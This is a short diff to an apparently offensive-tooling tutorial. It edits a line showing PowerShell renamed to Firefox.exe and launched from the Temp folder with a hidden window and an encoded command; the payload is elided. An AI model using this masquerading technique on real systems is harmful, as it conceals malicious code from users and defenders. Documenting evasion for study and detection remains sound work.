@@ -719,7 +719,7 @@ Here we can view the all process of encoding/decoding in powershell console
           rename it to Firefox.exe using an agent.bat before further ahead call the obfuscated
           powershell binary (Firefox.exe) to execute our powershell command line arguments.
 
-          C:\Users\pedro\AppData\Local\Temp\Firefox.exe -noP -wIn hIdDEn -enc ..SNIPET..
+          cd $env:tmp && .\Firefox.exe -noP -wIn hIdDEn -enc ..SNIPET..
 
 ![powershell rename](http://i.cubeupload.com/sl8UMD.jpg)
 
